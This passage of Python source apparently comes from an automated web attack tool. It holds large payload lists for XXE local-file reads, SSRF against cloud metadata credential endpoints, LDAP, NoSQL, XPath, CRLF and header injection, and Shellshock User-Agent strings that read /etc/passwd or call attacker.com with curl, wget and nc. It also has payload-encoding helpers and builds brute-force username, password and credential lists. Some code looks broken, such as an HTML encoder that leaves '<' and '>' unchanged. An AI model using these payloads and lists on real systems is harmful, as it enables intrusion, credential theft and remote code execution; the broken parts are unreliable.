                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///usr/local/apache/logs/access.log" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/vsftpd.log" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/sshd.log" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///var/log/mail" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/cmdline" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/stat" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/status" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/0" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/1" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/2" >]><foo>&xxe;</foo>""",
                """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/fd/255" >]><foo>&xxe;</foo>"""
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:22",
                "http://localhost:3306",
                "http://[::1]:80",
                "dict://localhost:11211/stat",
                "http://169.254.169.254/latest/user-data",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "http://100.100.100.200/latest/meta-data/",
                "http://192.168.0.1:8080/admin",
                "http://192.168.1.1:8080/admin",
                "http://10.0.0.1:8080/admin",
                "http://172.16.0.1:8080/admin",
                "http://192.168.10.1:8080/admin",
                "http://192.168.1.254:8080/admin",
                "http://192.168.0.254:8080/admin",
                "http://10.0.0.254:8080/admin",
                "http://172.16.0.254:8080/admin",
                "http://192.168.10.254:8080/admin",
                "http://192.168.1.1:80/admin",
                "http://192.168.0.1:80/admin",
                "http://10.0.0.1:80/admin",
                "http://172.16.0.1:80/admin",
                "http://192.168.10.1:80/admin",
                "http://192.168.1.254:80/admin",
                "http://192.168.0.254:80/admin",
                "http://10.0.0.254:80/admin",
                "http://172.16.0.254:80/admin",
                "http://192.168.10.254:80/admin",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/root",
                "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
                "http://169.254.169.254/openstack/latest/meta_data.json",
                "http://169.254.169.254/openstack/latest/user_data",
                "http://169.254.169.254/openstack/2012-08-10/meta_data.json",
                "http://169.254.169.254/openstack/2012-08-10/user_data",
                "http://169.254.169.254/2009-04-04/meta-data/",
                "http://169.254.169.254/2009-04-04/user-data/",
                "http://169.254.169.254/2009-04-04/meta-data/ami-id",
                "http://169.254.169.254/2009-04-04/meta-data/reservation-id",
                "http://169.254.169.254/2009-04-04/meta-data/hostname",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/openssh-key",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/comment",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/fingerprint",
                "http://169.254.169.254/2009-04-04/meta-data/instance-id",
                "http://169.254.169.254/2009-04-04/meta-data/instance-type",
                "http://169.254.169.254/2009-04-04/meta-data/local-hostname",
                "http://169.254.169.254/2009-04-04/meta-data/local-ipv4",
                "http://169.254.169.254/2009-04-04/meta-data/placement/",
                "http://169.254.169.254/2009-04-04/meta-data/placement/availability-zone",
                "http://169.254.169.254/2009-04-04/meta-data/kernel-id",
                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/",
                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/ami",
                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/root",
                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/ephemeral0",
                "http://169.254.169.254/2009-04-04/meta-data/block-device-mapping/swap",
                "http://169.254.169.254/2009-04-04/meta-data/security-groups",
                "http://169.254.169.254/2009-04-04/meta-data/public-hostname",
                "http://169.254.169.254/2009-04-04/meta-data/public-ipv4",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/openssh-key",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/comment",
                "http://169.254.169.254/2009-04-04/meta-data/public-keys/0/fingerprint",
                "http://169.254.169.254/2009-04-04/user-data",
                "http://169.254.169.254/2009-04-04/meta-data/",
                "http://169.254.169.254/2009-04-04/user-data/",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/meta-data/ami-id",
                "http://169.254.169.254/latest/meta-data/reservation-id",
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/meta-data/public-keys/",
                "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
                "http://169.254.169.254/latest/meta-data/public-keys/0/comment",
                "http://169.254.169.254/latest/meta-data/public-keys/0/fingerprint",
                "http://169.254.169.254/latest/meta-data/instance-id",
                "http://169.254.169.254/latest/meta-data/instance-type",
                "http://169.254.169.254/latest/meta-data/local-hostname",
                "http://169.254.169.254/latest/meta-data/local-ipv4",
                "http://169.254.169.254/latest/meta-data/placement/",
                "http://169.254.169.254/latest/meta-data/placement/availability-zone",
                "http://169.254.169.254/latest/meta-data/kernel-id",
                "http://169.254.169.254/latest/meta-data/block-device-mapping/",
                "http://169.254.169.254/latest/meta-data/block-device-mapping/ami",
                "http://169.254.169.254/latest/meta-data/block-device-mapping/root",
                "http://169.254.169.254/latest/meta-data/block-device-mapping/ephemeral0",
                "http://169.254.169.254/latest/meta-data/block-device-mapping/swap",
                "http://169.254.169.254/latest/meta-data/security-groups",
                "http://169.254.169.254/latest/meta-data/public-hostname",
                "http://169.254.169.254/latest/meta-data/public-ipv4",
                "http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
                "http://169.254.169.254/latest/meta-data/public-keys/0/comment",
                "http://169.254.169.254/latest/meta-data/public-keys/0/fingerprint",
                "http://169.254.169.254/latest/user-data"
            ],
            "ldap_injection": [
                "*)(uid=*))(|(uid=*",
                "*)(|(uid=*",
                "*))(|(uid=*",
                "*)(&))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*",
                "*)(&))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*))(|(uid=*"
            ],
            "nosql_injection": [
                "true, $where: '1 == 1'",
                ", $where: '1 == 1'",
                "$where: '1 == 1'",
                "', $where: '1 == 1'",
                "1, $where: '1 == 1'",
                "admin'--",
                "admin' #",
                "admin'/*",
                "admin' or '1'='1",
                "admin' or '1'='1'--",
                "admin' or '1'='1'#",
                "admin' or '1'='1'/*",
                "admin'or 1=1 or ''='",
                "admin' or 1=1",
                "admin' or 1=1--",
                "admin' or 1=1#",
                "admin' or 1=1/*",
                "admin') or ('1'='1",
                "admin') or ('1'='1'--",
                "admin') or ('1'='1'#",
                "admin') or ('1'='1'/*",
                "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
                "admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055"
            ],
            "xpath_injection": [
                "' or '1'='1",
                "' or ''='",
                "x' or 1=1 or 'x'='y",
                "/descendant-or-self::node()",
                "']*|",
                "' or position()=1 or '",
                "' or count(/descendant::*)>0 or '",
                "' or count(//*)>0 or '",
                "' or count(/child::*)>0 or '",
                "' or string-length(name(/*[1]))>0 or '",
                "' or contains(name(/*[1]),'A') or '",
                "' or contains(name(/*[1]),'B') or '",
                "' or contains(name(/*[1]),'C') or '",
                "' or contains(name(/*[1]),'D') or '",
                "' or contains(name(/*[1]),'E') or '",
                "' or contains(name(/*[1]),'F') or '",
                "' or contains(name(/*[1]),'G') or '",
                "' or contains(name(/*[1]),'H') or '",
                "' or contains(name(/*[1]),'I') or '",
                "' or contains(name(/*[1]),'J') or '",
                "' or contains(name(/*[1]),'K') or '",
                "' or contains(name(/*[1]),'L') or '",
                "' or contains(name(/*[1]),'M') or '",
                "' or contains(name(/*[1]),'N') or '",
                "' or contains(name(/*[1]),'O') or '",
                "' or contains(name(/*[1]),'P') or '",
                "' or contains(name(/*[1]),'Q') or '",
                "' or contains(name(/*[1]),'R') or '",
                "' or contains(name(/*[1]),'S') or '",
                "' or contains(name(/*[1]),'T') or '",
                "' or contains(name(/*[1]),'U') or '",
                "' or contains(name(/*[1]),'V') or '",
                "' or contains(name(/*[1]),'W') or '",
                "' or contains(name(/*[1]),'X') or '",
                "' or contains(name(/*[1]),'Y') or '",
                "' or contains(name(/*[1]),'Z') or '",
                "' or contains(name(/*[1]),'a') or '",
                "' or contains(name(/*[1]),'b') or '",
                "' or contains(name(/*[1]),'c') or '",
                "' or contains(name(/*[1]),'d') or '",
                "' or contains(name(/*[1]),'e') or '",
                "' or contains(name(/*[1]),'f') or '",
                "' or contains(name(/*[1]),'g') or '",
                "' or contains(name(/*[1]),'h') or '",
                "' or contains(name(/*[1]),'i') or '",
                "' or contains(name(/*[1]),'j') or '",
                "' or contains(name(/*[1]),'k') or '",
                "' or contains(name(/*[1]),'l') or '",
                "' or contains(name(/*[1]),'m') or '",
                "' or contains(name(/*[1]),'n') or '",
                "' or contains(name(/*[1]),'o') or '",
                "' or contains(name(/*[1]),'p') or '",
                "' or contains(name(/*[1]),'q') or '",
                "' or contains(name(/*[1]),'r') or '",
                "' or contains(name(/*[1]),'s') or '",
                "' or contains(name(/*[1]),'t') or '",
                "' or contains(name(/*[1]),'u') or '",
                "' or contains(name(/*[1]),'v') or '",
                "' or contains(name(/*[1]),'w') or '",
                "' or contains(name(/*[1]),'x') or '",
                "' or contains(name(/*[1]),'y') or '",
                "' or contains(name(/*[1]),'z') or '"
            ],
            "crlf_injection": [
                "%0d%0aheader:header",
                "%0d%0aheader:header%0d%0a",
                "%0d%0aheader:header%0d%0aheader2:header2",
                "%0d%0aLocation:http://example.com",
                "%0d%0aSet-Cookie:sessionid=123",
                "%0d%0aContent-Type:text/html",
                "%0d%0aRefresh:0;url=http://example.com",
                "%0d%0aX-Frame-Options:DENY",
                "%0d%0aX-Content-Type-Options:nosniff",
                "%0d%0aX-XSS-Protection:1;mode=block",
                "%0d%0aContent-Security-Policy:default-src 'self'",
                "%0d%0aStrict-Transport-Security:max-age=31536000",
                "%0d%0aX-Download-Options:noopen",
                "%0d%0aX-Permitted-Cross-Domain-Policies:none",
                "%0d%0aX-UA-Compatible:IE=edge",
                "%0d%0aCache-Control:no-cache",
                "%0d%0aPragma:no-cache",
                "%0d%0aExpires:0",
                "%0d%0aLast-Modified:0",
                "%0d%0aIf-Modified-Since:0",
                "%0d%0aIf-Unmodified-Since:0",
                "%0d%0aIf-Match:*",
                "%0d%0aIf-None-Match:*",
                "%0d%0aAccept:*/*",
                "%0d%0aAccept-Language:*",
                "%0d%0aAccept-Encoding:*",
                "%0d%0aAccept-Charset:*",
                "%0d%0aUser-Agent:*",
                "%0d%0aReferer:*",
                "%0d%0aAuthorization:*",
                "%0d%0aCookie:*",
                "%0d%0aConnection:*",
                "%0d%0aHost:*",
                "%0d%0aContent-Length:*",
                "%0d%0aContent-Type:*",
                "%0d%0aContent-Encoding:*",
                "%0d%0aContent-Language:*",
                "%0d%0aContent-Location:*",
                "%0d%0aContent-MD5:*",
                "%0d%0aContent-Range:*",
                "%0d%0aContent-Disposition:*",
                "%0d%0aDate:*",
                "%0d%0aServer:*",
                "%0d%0aX-Powered-By:*",
                "%0d%0aX-AspNet-Version:*",
                "%0d%0aX-AspNetMvc-Version:*",
                "%0d%0aX-Request-With:*",
                "%0d%0aX-Do-Not-Track:*",
                "%0d%0aDNT:*",
                "%0d%0aUpgrade:*",
                "%0d%0aVia:*",
                "%0d%0aWarning:*"
            ],
            "http_header_injection": [
                "Transfer-Encoding: chunked",
                "Content-Length: 0",
                "Connection: close",
                "Upgrade: websocket",
                "Via: 1.1 proxy",
                "Proxy-Connection: keep-alive",
                "X-Forwarded-For: 127.0.0.1",
                "X-Forwarded-Host: example.com",
                "X-Forwarded-Proto: https",
                "X-Original-URL: /admin",
                "X-Rewrite-URL: /admin",
                "X-Host: example.com",
                "X-Forwarded-Server: example.com",
                "X-HTTP-Method-Override: PUT",
                "X-Method-Override: PUT",
                "X-HTTP-Method: PUT",
                "Front-End-Https: on",
                "X-Forwarded-Protocol: https",
                "X-Forwarded-Ssl: on",
                "X-Url-Scheme: https",
                "X-Original-Host: example.com",
                "X-Custom-IP-Authorization: 127.0.0.1",
                "X-Client-IP: 127.0.0.1",
                "Client-IP: 127.0.0.1",
                "True-Client-IP: 127.0.0.1",
                "X-Real-IP: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1",
                "CF-Connecting-IP: 127.0.0.1",
                "X-Cluster-Client-IP: 127.0.0.1",
                "X-ProxyUser-Ip: 127.0.0.1",
                "WL-Proxy-Client-IP: 127.0.0.1",
                "Proxy-Client-IP: 127.0.0.1",
                "HTTP_CLIENT_IP: 127.0.0.1",
                "HTTP_X_FORWARDED_FOR: 127.0.0.1",
                "HTTP_X_FORWARDED: 127.0.0.1",
                "HTTP_X_CLUSTER_CLIENT_IP: 127.0.0.1",
                "HTTP_FORWARDED_FOR: 127.0.0.1",
                "HTTP_FORWARDED: 127.0.0.1",
                "HTTP_PROXY_CONNECTION: keep-alive",
                "HTTP_VIA: 1.1 proxy",
                "HTTP_X_PROXYUSER_IP: 127.0.0.1",
                "HTTP_WL_PROXY_CLIENT_IP: 127.0.0.1",
                "HTTP_PROXY_CLIENT_IP: 127.0.0.1",
                "Origin: null",
                "Referer: javascript:alert(1)",
                "User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'",
                "User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd'",
                "User-Agent: () { :; }; /bin/bash -c 'echo vulnerable'",
                "User-Agent: () { :; }; /bin/bash -c 'curl http://attacker.com/malware'",
                "User-Agent: () { :; }; /bin/bash -c 'wget http://attacker.com/malware'",
                "User-Agent: () { :; }; /bin/bash -c 'nc attacker.com 4444'",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                "User-Agent: Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
                "User-Agent: Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/90.0",
                "User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
                "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0"
            ]
        }
        
        return payload_data.get(category, [])
        
    def get_payloads(self, category):
        """Get payloads by category"""
        return self.payloads.get(category, [])
        
    def encode_payload(self, payload, encoding="base64"):
        """Encode payload with specified encoding"""
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            return quote_plus(payload)
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "double_url":
            return quote_plus(quote_plus(payload))
        elif encoding == "unicode":
            return ''.join('\\u{:04x}'.format(ord(c)) for c in payload)
        elif encoding == "html":
            html_entities = {
                '<': '<',
                '>': '>',
                '"': '&quot;',
                "'": '&#x27;',
                '&': '&amp;'
            }
            result = payload
            for char, entity in html_entities.items():
                result = result.replace(char, entity)
            return result
        return payload

class WordlistManager:
    """Advanced wordlist management with SecLists integration"""
    
    def __init__(self, config, logger, seclists_manager):
        self.config = config
        self.logger = logger
        self.seclists_manager = seclists_manager
        self.seclists_path = seclists_manager.seclists_path
        self.wordlists = {}
        self._initialize_wordlists()
        
    def _initialize_wordlists(self):
        """Initialize wordlists from SecLists"""
        self.logger.log("Initializing advanced wordlists...")
        
        # Directory wordlists
        dir_wordlists = [
            "Discovery/Web-Content/directory-list-2.3-small.txt",
            "Discovery/Web-Content/common.txt"
        ]
        
        directories = []
        for wl_path in dir_wordlists:
            full_path = os.path.join(self.seclists_path, wl_path)
            if os.path.exists(full_path):
                try:
                    with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                        directories.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                except Exception as e:
                    self.logger.log(f"Error reading wordlist {wl_path}: {e}", "ERROR")
                    
        # Add common directories
        common_dirs = [
            "admin", "login", "wp-admin", "administrator", "webadmin", "adminpanel",
            "control", "manager", "manage", "dashboard", "panel", "console",
            "backup", "backups", "config", "configuration", "settings",
            "upload", "uploads", "download", "downloads", "files",
            "images", "img", "css", "js", "javascript", "scripts",
            "api", "rest", "v1", "v2", "graphql", "soap",
            "tmp", "temp", "logs", "log", "cache", "db", "database",
            "secret", "private", "internal", "debug", "test", "testing",
            "dev", "development", "staging", "beta", "old", "legacy"
        ]
        directories.extend(common_dirs)
        
        # Save combined directory wordlist
        dir_filepath = os.path.join(WORDLIST_DIR, "directories.txt")
        with open(dir_filepath, 'w') as f:
            for word in sorted(set(directories)):  # Remove duplicates and sort
                f.write(word + '\n')
        self.wordlists["directories"] = list(set(directories))
        self.logger.log(f"Generated directory wordlist with {len(directories)} entries")
        
        # Username wordlists
        user_wordlists = [
            "Usernames/top-usernames-shortlist.txt"
        ]
        
        usernames = []
        for wl_path in user_wordlists:
            full_path = os.path.join(self.seclists_path, wl_path)
            if os.path.exists(full_path):
                try:
                    with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                        usernames.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                except Exception as e:
                    self.logger.log(f"Error reading wordlist {wl_path}: {e}", "ERROR")
                    
        # Add common usernames
        common_users = [
            "admin", "root", "user", "test", "guest", "demo", "manager",
            "operator", "supervisor", "administrator", "webadmin", "sysadmin",
            "developer", "dev", "support", "helpdesk", "info", "contact"
        ]
        usernames.extend(common_users)
        
        # Save username wordlist
        user_filepath = os.path.join(WORDLIST_DIR, "usernames.txt")
        with open(user_filepath, 'w') as f:
            for user in sorted(set(usernames)):
                f.write(user + '\n')
        self.wordlists["usernames"] = list(set(usernames))
        self.logger.log(f"Generated username wordlist with {len(usernames)} entries")
        
        # Password wordlists
        pass_wordlists = [
            "Passwords/Common-Credentials/rockyou-75.txt"
        ]
        
        passwords = []
        for wl_path in pass_wordlists:
            full_path = os.path.join(self.seclists_path, wl_path)
            if os.path.exists(full_path):
                try:
                    with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                        passwords.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                except Exception as e:
                    self.logger.log(f"Error reading wordlist {wl_path}: {e}", "ERROR")
                    
        # Add common passwords
        common_passwords = [
            "password", "123456", "qwerty", "admin123", "welcome",
            "password123", "admin1234", "root123", "test123",
            "default", "guest", "demo", "changeme", "letmein"
        ]
        passwords.extend(common_passwords)
        
        # Save password wordlist
        pass_filepath = os.path.join(WORDLIST_DIR, "passwords.txt")
        with open(pass_filepath, 'w') as f:
            for passwd in sorted(set(passwords)):
                f.write(passwd + '\n')
        self.wordlists["passwords"] = list(set(passwords))
        self.logger.log(f"Generated password wordlist with {len(passwords)} entries")
        
        # Credential combinations
        credentials = []
        for user in usernames[:50]:  # Limit for performance
            for passwd in passwords[:50]:
                credentials.append(f"{user}:{passwd}")
                
        # Save credential wordlist
        cred_filepath = os.path.join(WORDLIST_DIR, "credentials.txt")
        with open(cred_filepath, 'w') as f:
            for cred in credentials:
                f.write(cred + '\n')
        self.wordlists["credentials"] = credentials
        self.logger.log(f"Generated credential wordlist with {len(credentials)} entries")
        
        # Additional wordlists for enhanced testing
        additional_words = [
            "index", "home", "about", "contact", "services", "products",
            "blog", "news", "support", "help", "docs", "documentation",
            "forum", "community", "wiki", "kb", "knowledgebase",
            "profile", "account", "user", "users", "member", "members",
            "register", "signup", "signin", "signout", "logout",
            "cart", "checkout", "order", "orders", "payment", "payments",
            "search", "find", "browse", "explore", "discover",
            "settings", "preferences", "options", "config", "configuration",
            "admin", "administrator", "moderator", "mod", "operator",
            "manager", "supervisor", "director", "executive",
            "api", "rest", "graphql", "soap", "rpc", "json", "xml",
            "upload", "download", "import", "export", "backup", "restore",
            "login", "logon", "auth", "authenticate", "authentication",
            "register", "registration", "signup", "subscribe",
            "forgot", "reset", "recover", "recovery", "password",
            "confirm", "verify", "verification", "activate", "activation",
            "dashboard", "control", "controlpanel", "panel", "console",
            "report", "reports", "analytics", "stats", "statistics",
            "log", "logs", "audit", "auditlog", "history",
            "debug", "test", "testing", "dev", "development", "staging",
            "prod", "production", "live", "main", "master",
            "beta", "alpha", "gamma", "delta", "preview", "demo",
            "old", "legacy", "archive", "backup", "tmp", "temp",
            "cache", "session", "sessions", "cookie", "cookies",
            "db", "database", "sql", "nosql", "mongo", "mongodb",
            "redis", "memcache", "elasticsearch", "solr",
            "file", "files", "document", "documents", "image", "images",
            "video", "videos", "audio", "music", "sound",
            "css", "js", "javascript", "script", "scripts",
            "html", "xml", "json", "yaml", "yml", "config", "configuration",
            "template", "templates", "theme", "themes", "layout", "layouts",
            "plugin", "plugins", "module", "modules", "extension", "extensions",
            "library", "libraries", "lib", "libs", "framework", "frameworks",
            "package", "packages", "bundle", "bundles", "component", "components",
            "service", "services", "microservice", "microservices",
            "function", "functions", "method", "methods", "class", "classes",
            "object", "objects", "interface", "interfaces", "trait", "traits",
            "enum", "enums", "constant", "constants", "variable", "variables",
            "parameter", "parameters", "argument", "arguments", "option", "options",
            "flag", "flags", "switch", "switches", "toggle", "toggles",
